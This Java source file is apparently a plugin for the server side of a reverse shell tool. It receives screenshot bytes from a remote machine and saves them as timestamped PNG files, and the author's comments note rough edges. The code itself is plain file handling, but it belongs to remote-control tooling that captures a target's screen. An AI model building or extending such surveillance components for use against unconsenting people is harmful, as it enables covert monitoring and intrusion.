package obs1d1anc1ph3r.reverseshell.server.plugins.reactive.utils;

import java.io.IOException;
import java.nio.file.*;
import java.text.SimpleDateFormat;
import java.util.Date;

public class ReceiveScreenShot {

    private static final String SCREENSHOT_DIR = "screenshots";

    public void receiveScreenshotData(byte[] imageBytes) {
        saveScreenshot(imageBytes);
    }

    //Save screenshot
    private void saveScreenshot(byte[] imageBytes) {
        try {
            Path saveDir = Paths.get(SCREENSHOT_DIR); //Literally makes a directory called screenshot, maybe I should have it just put it in the ip directory, or create the ip directory if it doesn't exist
            if (Files.notExists(saveDir)) {
                Files.createDirectories(saveDir);
                System.out.println("[INFO] Created directory for screenshots: " + saveDir.toAbsolutePath());
            }

            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date()); //Saves based on the time and date
            Path screenshotFile = saveDir.resolve("screenshot_" + timestamp + ".png"); //Don't take too many too quickly or it will overwrite them, could implement a fix for that at somepoint

            Files.write(screenshotFile, imageBytes); //Write the bytes
            System.out.println("[INFO] Screenshot saved at: " + screenshotFile.toAbsolutePath());
            System.out.print("[-] Command> ");
        } catch (IOException ex) {
            System.err.println("[ERROR] Failed to save screenshot: " + ex.getMessage());
        }
    }
}
